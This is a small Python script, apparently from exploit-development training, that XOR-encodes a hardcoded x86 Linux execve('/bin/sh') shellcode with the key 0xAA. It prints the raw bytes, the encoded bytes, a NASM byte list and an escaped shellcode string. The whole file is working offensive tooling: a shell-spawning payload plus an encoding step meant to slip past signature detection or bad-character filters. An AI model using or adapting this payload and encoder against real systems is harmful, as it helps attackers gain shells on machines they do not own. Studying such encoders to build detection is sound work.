#!/usr/bin/python3
import sys
import binascii

encoder = b"\xAA"

def encode(shellcode,encoder=encoder):
    encoded = []
    i = 0
    for instruction in bytearray(shellcode):
        encbyte = instruction ^ int.from_bytes(encoder,byteorder="little")
        encoded.append(encbyte)
        # print(hex(instruction) +  " x " + hex(int.from_bytes(encoder,byteorder="little")) + " = " + hex(encbyte) )
    return encoded


if __name__ == "__main__":
    print("=======================")
    print("XOR encoder by fuzboxz")
    print("=======================",end="\n\n")
    
    shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" #/bin/sh
    
    print("Length: " + str(len(shellcode)) + " bytes", end="\n\n")
    
    print("Raw: ", end="")
    for b in bytearray(shellcode):
        print(hex(b),end=" ")
    print()
    
    encoded = encode(shellcode)

    print("Enc: ", end="")
    for b in bytearray(encoded):
        print(hex(b),end=" ")
    print()
    
    print("NASM: ", end="")
    for b in bytearray(encoded)[:-1]:
        print(hex(b),end=",")
    print(hex(encoded[-1]))

    print("Shellcode: ", end="")
    formatted = ""
    for b in bytearray(encoded):
        formatted += hex(b)
    formatted = formatted.replace("0x","\\x")
    print(formatted)